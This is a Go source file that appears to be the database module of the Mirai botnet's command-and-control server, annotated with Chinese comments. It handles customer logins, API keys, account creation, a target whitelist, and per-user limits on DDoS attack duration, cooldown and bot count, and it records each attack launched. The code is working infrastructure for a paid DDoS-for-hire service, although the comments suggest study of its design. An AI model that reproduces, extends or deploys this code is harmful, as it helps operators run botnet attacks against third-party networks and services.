package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

//数据库管理，包括用户登录验证、新建用户、处理白名单、验证用户的攻击请求

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("Mysql DB opened")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

//判断是否targets中包含白名单，包含则返回true。
func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist") //查询白名单数据库中的target信息（ip、mask）
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() { //遍历白名单信息
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Parse prefix
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets { //遍历目标的ip
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf) //target ip
			if aN > netmask {                               // Whitelist is less specific than attack target
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) { //屏蔽掉掩码，看ip的不可变部分是否相同
					return true
				}
			} else if aN < netmask { // Attack target is less specific than whitelist
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { // Both target and whitelist have same prefix
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

//查找历史攻击情况，记录本次攻击到history数据库中
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &cooldown)

	if durationLimit != 0 && duration > durationLimit { //检测duration没有超过用户的DDoS持续时间限制（duration_limit字段）。
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()
	//根据history数据库，判断是否还可以同期发起攻击【查找历史攻击记录，eg：发起时间、持续时间、攻击命令等】
	if allowConcurrent == 0 { //默认设置为1
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	//在history表中记录此次攻击发起事件。
	//max_bots字段记录的是本次攻击申请的bots数，而不是该用户允许的最大bots数量。
	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

//基于api-key，来查询请求DDoS的用户是否授权过/购买过该项服务
func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	//指定api-key
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
